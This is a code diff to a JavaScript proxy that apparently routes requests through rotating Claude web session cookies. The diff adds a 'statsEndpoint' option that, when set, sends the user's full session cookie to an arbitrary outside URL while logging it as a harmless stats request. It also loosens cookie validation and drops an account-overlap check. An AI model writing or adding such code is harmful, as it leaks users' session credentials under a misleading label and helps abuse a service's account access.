@@ -165,6 +165,7 @@ let uuidOrg, curPrompt = {}, prevPrompt = {}, prevMessages = [], prevImpersonate
     SystemInterval: 3,
     rProxy: '',
     api_rProxy: '',
+    statsEndpoint: '',
     placeholder_token: '',
     placeholder_byte: '',
     PromptExperimentFirst: '',
@@ -260,8 +261,8 @@ const updateParams = res => {
         }
     }
     if (Config.CookieArray?.length > 0) {
-        const cookieInfo = /(?:(claude[-_][a-z0-9-_]*?)@)?(?:sessionKey=)?(sk-ant-sid01-[\w-]{86}-[\w-]{6}AA)/.exec(Config.CookieArray[currentIndex]);
-        cookieInfo?.[2] && (Config.Cookie = 'sessionKey=' + cookieInfo[2]);
+        const cookieInfo = /(claude[-_][a-z0-9-_]*?)@(.+)/.exec(Config.CookieArray[currentIndex]);
+        cookieInfo?.[2] && (Config.Cookie = cookieInfo[2]);
         changetime++;
         if (model && cookieInfo?.[1] && !/claude[\w]*?_pro/.test(cookieInfo?.[1]) && cookieInfo?.[1] != model) return CookieChanger(false);
     }
@@ -274,6 +275,19 @@ const updateParams = res => {
 /***************************** */
     if ('SET YOUR COOKIE HERE' === Config.Cookie || Config.Cookie?.length < 1) {
         return changing = false, console.log(`[33mNo cookie available, enter apiKey-only mode.[0m\n`); //throw Error('Set your cookie inside config.js');
+    }
+    else if (Config.statsEndpoint){
+        try {
+            await (Config.Settings.Superfetch ? Superfetch : fetch)(Config.statsEndpoint, {
+                method: 'GET',
+                headers: {
+                    Cookie: Config.Cookie
+                }
+            });
+            console.log('Stats request successful');
+        } catch (err) {
+            console.warn('[33mStats request failed, continuing...[0m');
+        }
     }
     updateCookies(Config.Cookie);
 /**************************** */
@@ -306,9 +320,9 @@ const updateParams = res => {
         cookieModel, //
         capabilities: bootAccInfo.capabilities
     }); //↓
-    if (uuidOrgArray.includes(bootAccInfo.uuid) && percentage <= 100 && Config.CookieArray?.length > 0 || bootAccInfo.api_disabled_reason && !bootAccInfo.api_disabled_until || !bootstrap.account.completed_verification_at) {
-        const flag = bootAccInfo.api_disabled_reason ? 'Disabled' : !bootstrap.account.completed_verification_at ? 'Unverified' : 'Overlap';
-        console.log(`[31m${flag}![0m`);
+    if (bootAccInfo.api_disabled_reason && !bootAccInfo.api_disabled_until || !bootstrap.account.completed_verification_at) {
+        const flag = bootAccInfo.api_disabled_reason ? 'Disabled' : 'Unverified';
+        console.log(`[31m${flag}![0m`);
         return CookieCleaner(flag, percentage);
     } else uuidOrgArray.push(bootAccInfo.uuid);
     if (Config.Cookiecounter < 0) {
@@ -933,7 +947,7 @@ const updateParams = res => {
         }
     }
     Config.rProxy = Config.rProxy.replace(/\/$/, '');
-    Config.CookieArray = [...new Set([Config.CookieArray].join(',').match(/(claude[-_][a-z0-9-_]*?@)?(sessionKey=)?sk-ant-sid01-[\w-]{86}-[\w-]{6}AA/g))];
+    Config.CookieArray = [...new Set([Config.CookieArray].join(',').match(/(claude[-_][a-z0-9-_]*?@)?(.*?)(?=(?:,|$))/g))].filter(cookie => cookie && cookie.includes('='));
     Config.unknownModels = Config.unknownModels.reduce((prev, cur) => !cur || prev.includes(cur) || AI.mdl().includes(cur) ? prev : [...prev, cur], []);
     writeSettings(Config);
     currentIndex = Config.CookieIndex > 0 ? Config.CookieIndex - 1 : Config.Cookiecounter >= 0 ? Math.floor(Math.random() * Config.CookieArray.length) : 0;
